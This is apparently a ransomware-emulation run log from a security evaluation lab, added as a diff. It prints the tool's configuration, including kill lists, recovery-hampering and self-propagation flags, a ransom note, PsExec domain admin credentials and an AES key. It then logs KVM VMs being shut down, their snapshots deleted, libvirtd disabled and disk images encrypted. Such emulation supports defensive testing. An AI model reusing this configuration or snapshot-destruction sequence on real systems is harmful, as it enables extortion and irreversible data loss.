@@ -1,0 +1,218 @@
+[INFO]  [2023-10-18 13:18:56] Loaded configuration information.
+[INFO]  [2023-10-18 13:18:56] Current configuration:  
+    kill_processes: ["msedge", "encsvc", "mydesktopqos", "xfssvccon", "firefox", "infopath", "winword", "steam", "synctime", "notepad", "ocomm", "onenote", "mspub", "thunderbird", "agntsvc", "sql", "excel", "powerpnt", "outlook", "wordpad", "isqlplussvc", "sqbcoreservice", "oracle", "ocautoupds", "dbsnmp", "msaccess", "tbirdconfig", "ocssd", "mydesktopservice", "visio", "mepocs", "memtas", "veeam", "backup", "sql", "vss", "msexchange"]
+    kill_services: ["BDESVC", "MSSQLSERVER", "SDRSVC", "VSS", "wuauserv"]
+    kill_processes_linux: ["libvirtd", "virsh", "libvirt-dbus"]
+    kill_services_linux: ["libvirtd"]
+    exclude_directory_names: ["system volume information", "intel", "$windows.~ws", "application data", "$recycle.bin", "mozilla", "program files (x86)", "program files", "$windows.~bt", "public", "msocache", "windows", "default", "all users", "tor browser", "programdata", "boot", "config.msi", "google", "perflogs", "appdata", "windows.old", "WindowsAzure"]
+    exclude_file_names: ["desktop.ini", "autorun.inf", "ntldr", "bootsect.bak", "thumbs.db", "boot.ini", "ntuser.dat", "iconcache.db", "bootfont.bin", "ntuser.ini", "ntuser.dat.log"]
+    exclude_file_extensions: ["themepack", "nls", "diagpkg", "msi", "lnk", "exe", "cab", "scr", "bat", "drv", "rtp", "msp", "prf", "msc", "ico", "key", "ocx", "diagcab", "diagcfg", "pdb", "wpx", "hlp", "icns", "rom", "dll", "msstyles", "mod", "ps1", "ics", "hta", "bin", "cmd", "ani", "386", "lock", "cur", "idx", "sys", "com", "deskthemepack", "shs", "ldf", "theme", "mpa", "nomedia", "spl", "cpl", "adv", "icl", "msu", "xtlog"]
+    strict_include_paths: ["C:\\Users\\Public\\bctest"]
+    enable_set_wallpaper: true
+    enable_network_discovery: true
+    enable_self_propagation: true
+    enable_vm_kill: true
+    enable_vm_snapshot_kill: true
+    enable_enc: true
+    enable_recovery_hampering: true
+    enable_event_del: true
+    enable_hidden_partitions: true
+    unmount_hidden_partitions: true
+    extension: .skyfl2e
+    note_file_name: RECOVER-SKYFL2E-FILES.txt
+    note_full_text: >>Introduction
+Important files on your machine were ENCRYPTED and now they have the "SKYFL2E" extension.
+In order to recover your files, you need to follow the instructions below.
+
+>>CAUTION
+DO NOT MODIFY ENCRYPTED FILES YOURSELF.
+DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
+YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
+YOUR DATA IS STRONGLY ENCRYPTED, YOU CANNOT DECRYPT IT WITHOUT CIPHER KEY.
+
+>>What Should I do Next?
+Follow these simple steps to get everything back to normal:
+1) Download and install Tor browser from https://www.torproject.org/download/
+2) Navigate to: askfjejtqekjge0et1lkjasdq09gji13jgkdajv.testonion/?access-key=2646AEF615CD1126
+
+    empty_recycle_bin: true
+    psexec_username: digirunaway\evals_domain_admin
+    psexec_password: axi9eengei9inaeR@
+    strict_include_targets: ["10.10.20.22"]
+
+[INFO]  [2023-10-18 13:18:56] Running ELEVATED
+[INFO]  [2023-10-18 13:18:56] Created encryption thread pool of size 4
+[INFO]  [2023-10-18 13:18:56] Determining system UUID.
+[DEBUG] [2023-10-18 13:18:56] Elevated: getting UUID from /sys/class/dmi/id/product_uuid.
+[INFO]  [2023-10-18 13:18:56] CSProduct UUID is 840f39a2-5791-43a9-b31d-4b0f62b89b11
+[INFO]  [2023-10-18 13:18:56] System ID: 840f39a2-5791-43a9-b31d-4b0f62b89b11
+[INFO]  [2023-10-18 13:18:56] Currently running as user: root
+[INFO]  [2023-10-18 13:18:56] Currently running on host: leomon
+[INFO]  [2023-10-18 13:18:56] Executing virsh version to find KVM version info.
+[DEBUG] [2023-10-18 13:18:56] Executing: virsh version
+[DEBUG] [2023-10-18 13:18:57] virsh exited with exit status: 0
+[INFO]  [2023-10-18 13:18:57] stdout: Compiled against library: libvirt 8.0.0
+Using library: libvirt 8.0.0
+Using API: QEMU 8.0.0
+Running hypervisor: QEMU 6.2.0
+
+
+[INFO]  [2023-10-18 13:18:57] stderr: 
+[INFO]  [2023-10-18 13:18:57] Confirmed KVM installed on target machine.
+[INFO]  [2023-10-18 13:18:57] Enumerating VMs.
+[INFO]  [2023-10-18 13:18:57] Executing virsh list to list all VMs
+[INFO]  [2023-10-18 13:18:57] Discovered the following KVM VMs:
+fedora2
+test1
+test2
+[INFO]  [2023-10-18 13:18:57] Shutting down VMs.
+[DEBUG] [2023-10-18 13:18:57] Executing: virsh shutdown --domain fedora2
+[DEBUG] [2023-10-18 13:18:57] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:57] stdout: Domain 'fedora2' is being shutdown
+
+
+[INFO]  [2023-10-18 13:18:57] Successfully began shutting down VM fedora2
+[DEBUG] [2023-10-18 13:18:57] Executing: virsh shutdown --domain test1
+[DEBUG] [2023-10-18 13:18:57] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:57] stdout: Domain 'test1' is being shutdown
+
+
+[INFO]  [2023-10-18 13:18:57] Successfully began shutting down VM test1
+[DEBUG] [2023-10-18 13:18:57] Executing: virsh shutdown --domain test2
+[DEBUG] [2023-10-18 13:18:57] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:57] stdout: Domain 'test2' is being shutdown
+
+
+[INFO]  [2023-10-18 13:18:57] Successfully began shutting down VM test2
+[INFO]  [2023-10-18 13:18:57] Enumerating and deleting VM snapshots.
+[DEBUG] [2023-10-18 13:18:57] Executing: virsh snapshot-list fedora2
+[DEBUG] [2023-10-18 13:18:57] virsh exited with exit status: 0
+[INFO]  [2023-10-18 13:18:57] Discovered the following snapshots for fedora2:
+debugsnapshot
+fedora2_2023-08-16T16:17
+fedora2_2023-08-28T12:17
+[INFO]  [2023-10-18 13:18:57] Deleting snapshot debugsnapshot for VM fedora2
+[DEBUG] [2023-10-18 13:18:57] Executing: virsh snapshot-delete --domain fedora2 --snapshotname debugsnapshot
+[DEBUG] [2023-10-18 13:18:57] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:57] stdout: Domain snapshot debugsnapshot deleted
+
+
+[INFO]  [2023-10-18 13:18:57] Successfully deleted snapshot debugsnapshot for VM fedora2
+[INFO]  [2023-10-18 13:18:57] Deleting snapshot fedora2_2023-08-16T16:17 for VM fedora2
+[DEBUG] [2023-10-18 13:18:57] Executing: virsh snapshot-delete --domain fedora2 --snapshotname fedora2_2023-08-16T16:17
+[DEBUG] [2023-10-18 13:18:58] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:58] stdout: Domain snapshot fedora2_2023-08-16T16:17 deleted
+
+
+[INFO]  [2023-10-18 13:18:58] Successfully deleted snapshot fedora2_2023-08-16T16:17 for VM fedora2
+[INFO]  [2023-10-18 13:18:58] Deleting snapshot fedora2_2023-08-28T12:17 for VM fedora2
+[DEBUG] [2023-10-18 13:18:58] Executing: virsh snapshot-delete --domain fedora2 --snapshotname fedora2_2023-08-28T12:17
+[DEBUG] [2023-10-18 13:18:58] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:58] stdout: Domain snapshot fedora2_2023-08-28T12:17 deleted
+
+
+[INFO]  [2023-10-18 13:18:58] Successfully deleted snapshot fedora2_2023-08-28T12:17 for VM fedora2
+[DEBUG] [2023-10-18 13:18:58] Executing: virsh snapshot-list test1
+[DEBUG] [2023-10-18 13:18:58] virsh exited with exit status: 0
+[INFO]  [2023-10-18 13:18:58] Discovered the following snapshots for test1:
+debugsnapshot
+snapshot with space
+test1_2023-08-16T16:15
+test1_2023-08-16T16:17
+test1_2023-08-28T12:17
+[INFO]  [2023-10-18 13:18:58] Deleting snapshot debugsnapshot for VM test1
+[DEBUG] [2023-10-18 13:18:58] Executing: virsh snapshot-delete --domain test1 --snapshotname debugsnapshot
+[DEBUG] [2023-10-18 13:18:58] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:58] stdout: Domain snapshot debugsnapshot deleted
+
+
+[INFO]  [2023-10-18 13:18:58] Successfully deleted snapshot debugsnapshot for VM test1
+[INFO]  [2023-10-18 13:18:58] Deleting snapshot snapshot with space for VM test1
+[DEBUG] [2023-10-18 13:18:58] Executing: virsh snapshot-delete --domain test1 --snapshotname snapshot with space
+[DEBUG] [2023-10-18 13:18:58] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:58] stdout: Domain snapshot snapshot with space deleted
+
+
+[INFO]  [2023-10-18 13:18:58] Successfully deleted snapshot snapshot with space for VM test1
+[INFO]  [2023-10-18 13:18:58] Deleting snapshot test1_2023-08-16T16:15 for VM test1
+[DEBUG] [2023-10-18 13:18:58] Executing: virsh snapshot-delete --domain test1 --snapshotname test1_2023-08-16T16:15
+[DEBUG] [2023-10-18 13:18:58] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:58] stdout: Domain snapshot test1_2023-08-16T16:15 deleted
+
+
+[INFO]  [2023-10-18 13:18:58] Successfully deleted snapshot test1_2023-08-16T16:15 for VM test1
+[INFO]  [2023-10-18 13:18:58] Deleting snapshot test1_2023-08-16T16:17 for VM test1
+[DEBUG] [2023-10-18 13:18:58] Executing: virsh snapshot-delete --domain test1 --snapshotname test1_2023-08-16T16:17
+[DEBUG] [2023-10-18 13:18:58] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:58] stdout: Domain snapshot test1_2023-08-16T16:17 deleted
+
+
+[INFO]  [2023-10-18 13:18:58] Successfully deleted snapshot test1_2023-08-16T16:17 for VM test1
+[INFO]  [2023-10-18 13:18:58] Deleting snapshot test1_2023-08-28T12:17 for VM test1
+[DEBUG] [2023-10-18 13:18:58] Executing: virsh snapshot-delete --domain test1 --snapshotname test1_2023-08-28T12:17
+[DEBUG] [2023-10-18 13:18:59] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:59] stdout: Domain snapshot test1_2023-08-28T12:17 deleted
+
+
+[INFO]  [2023-10-18 13:18:59] Successfully deleted snapshot test1_2023-08-28T12:17 for VM test1
+[DEBUG] [2023-10-18 13:18:59] Executing: virsh snapshot-list test2
+[DEBUG] [2023-10-18 13:18:59] virsh exited with exit status: 0
+[INFO]  [2023-10-18 13:18:59] Discovered the following snapshots for test2:
+debugsnapshot
+[INFO]  [2023-10-18 13:18:59] Deleting snapshot debugsnapshot for VM test2
+[DEBUG] [2023-10-18 13:18:59] Executing: virsh snapshot-delete --domain test2 --snapshotname debugsnapshot
+[DEBUG] [2023-10-18 13:18:59] virsh exited with exit status: 0
+[DEBUG] [2023-10-18 13:18:59] stdout: Domain snapshot debugsnapshot deleted
+
+
+[INFO]  [2023-10-18 13:18:59] Successfully deleted snapshot debugsnapshot for VM test2
+[INFO]  [2023-10-18 13:18:59] Enumerating volume paths from default pool.
+[INFO]  [2023-10-18 13:18:59] Discovered the following default pool volume paths:
+/var/lib/libvirt/images/fedora2.qcow2
+/var/lib/libvirt/images/test1.qcow2
+/var/lib/libvirt/images/test2.qcow2
+[INFO]  [2023-10-18 13:18:59] Waiting for VMs to finish shutting down.
+[INFO]  [2023-10-18 13:19:29] Generating AES key.
+[INFO]  [2023-10-18 13:19:29] AES key set to: 7b8b5f02231c4cf3cc6820e55601ac2e
+[INFO]  [2023-10-18 13:19:29] Terminating processes and services that may interfere with encryption.
+[INFO]  [2023-10-18 13:19:29] Trying to kill services ["libvirtd"]
+[INFO]  [2023-10-18 13:19:29] Stopping service libvirtd
+[DEBUG] [2023-10-18 13:19:29] Executing: systemctl stop libvirtd
+[DEBUG] [2023-10-18 13:19:29] systemctl exited with exit status: 0
+[DEBUG] [2023-10-18 13:19:29] stderr: Warning: Stopping libvirtd.service, but it can still be activated by:
+  libvirtd.socket
+  libvirtd-admin.socket
+  libvirtd-ro.socket
+
+[INFO]  [2023-10-18 13:19:29] Stopped service libvirtd
+[INFO]  [2023-10-18 13:19:29] Disabling service libvirtd
+[DEBUG] [2023-10-18 13:19:29] Executing: systemctl disable libvirtd
+[DEBUG] [2023-10-18 13:19:29] systemctl exited with exit status: 0
+[DEBUG] [2023-10-18 13:19:29] stderr: Removed /etc/systemd/system/multi-user.target.wants/libvirtd.service.
+Removed /etc/systemd/system/sockets.target.wants/virtlockd.socket.
+Removed /etc/systemd/system/sockets.target.wants/virtlogd.socket.
+Removed /etc/systemd/system/sockets.target.wants/libvirtd.socket.
+Removed /etc/systemd/system/sockets.target.wants/libvirtd-ro.socket.
+
+[INFO]  [2023-10-18 13:19:29] Disabled service libvirtd
+[INFO]  [2023-10-18 13:19:29] Refreshing systemd
+[DEBUG] [2023-10-18 13:19:29] Executing: systemctl daemon-reload
+[DEBUG] [2023-10-18 13:19:29] systemctl exited with exit status: 0
+[INFO]  [2023-10-18 13:19:29] Refreshed systemd
+[INFO]  [2023-10-18 13:19:29] Finished terminating services.
+[INFO]  [2023-10-18 13:19:29] Attempting to kill processes ["libvirtd", "virsh", "libvirt-dbus"]
+[INFO]  [2023-10-18 13:19:29] Killed process "/usr/sbin/libvirt-dbus" with PID 638011
+[INFO]  [2023-10-18 13:19:29] Encrypting VM volumes.
+[DEBUG] [2023-10-18 13:19:29] Encrypting volume at /var/lib/libvirt/images/test2.qcow2
+[DEBUG] [2023-10-18 13:19:29] /var/lib/libvirt/images/test2.qcow2 has huge size of 6460932096 bytes - encrypting via chunk method.
+[DEBUG] [2023-10-18 13:19:29] Encrypting volume at /var/lib/libvirt/images/fedora2.qcow2
+[DEBUG] [2023-10-18 13:19:29] /var/lib/libvirt/images/fedora2.qcow2 has huge size of 10739318784 bytes - encrypting via chunk method.
+[DEBUG] [2023-10-18 13:19:29] Encrypting volume at /var/lib/libvirt/images/test1.qcow2
+[DEBUG] [2023-10-18 13:19:29] /var/lib/libvirt/images/test1.qcow2 has huge size of 11125981532 bytes - encrypting via chunk method.
+[DEBUG] [2023-10-18 13:19:39] Successfully encrypted and added extension to volume /var/lib/libvirt/images/fedora2.qcow2
+[INFO]  [2023-10-18 13:19:39] Ransom note written to /var/lib/libvirt/images/RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 13:19:48] Successfully encrypted and added extension to volume /var/lib/libvirt/images/test2.qcow2
+[DEBUG] [2023-10-18 13:19:48] Ransom note already exists at /var/lib/libvirt/images/RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 13:19:54] Successfully encrypted and added extension to volume /var/lib/libvirt/images/test1.qcow2
+[DEBUG] [2023-10-18 13:19:54] Ransom note already exists at /var/lib/libvirt/images/RECOVER-SKYFL2E-FILES.txt
+[INFO]  [2023-10-18 13:19:54] Finished encrypting VM volumes.
